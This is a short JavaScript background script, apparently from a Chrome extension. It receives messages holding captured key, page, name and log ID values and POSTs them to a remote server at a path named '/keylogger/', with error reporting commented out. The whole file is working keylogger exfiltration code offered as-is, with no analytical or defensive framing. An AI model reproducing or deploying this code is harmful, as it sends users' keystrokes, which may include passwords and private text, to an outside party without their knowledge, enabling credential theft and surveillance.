function handleMessage (request) {
	data = "key="+request.key+"&page="+request.page+"&name="+request.name+"&log_id="+request.log_id;
	console.log(request);
	fetch("https://dev.micinproject.my.id/keylogger/", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: data
    })
    .then(response => {
        // console.log(response);
    })
    .catch(error => {
        // console.error(error);
    });
}
chrome.runtime.onMessage.addListener(handleMessage);

